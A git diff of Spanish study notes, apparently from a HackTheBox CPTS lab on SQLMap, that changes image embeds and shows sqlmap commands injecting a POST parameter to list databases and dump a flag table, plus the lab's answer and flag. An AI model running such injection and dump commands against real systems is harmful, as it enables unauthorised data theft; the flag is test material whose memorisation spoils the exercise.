@@ -18,7 +18,9 @@ answer: **Union query-based**
 sqlmap -u 'http://154.57.164.78:32460/case2.php' --data 'id=1*' --method POST -H 'Content-Type: application/x-www-form-urlencoded' --dbs --batch 
 ```
 
-![[Preparación CPTS/Modulos/SQLMap Essentials/images/bbdd.png]]
+<p align="center"> 
+<img src="images/bbdd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Aquí tienes el desglose rápido de qué hace cada parte:
 
@@ -33,7 +35,9 @@ Aquí tienes el desglose rápido de qué hace cada parte:
 sqlmap -u 'http://154.57.164.78:32460/case2.php' --data 'id=1*' --method POST -H 'Content-Type: application/x-www-form-urlencoded' -D testdb -T flag2 --dump --batch
 ```
 
-![[Preparación CPTS/Modulos/SQLMap Essentials/images/flag.png]]
+<p align="center"> 
+<img src="images/flag.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{700_much_c0n6r475_0n_p057_r3qu357}**
 
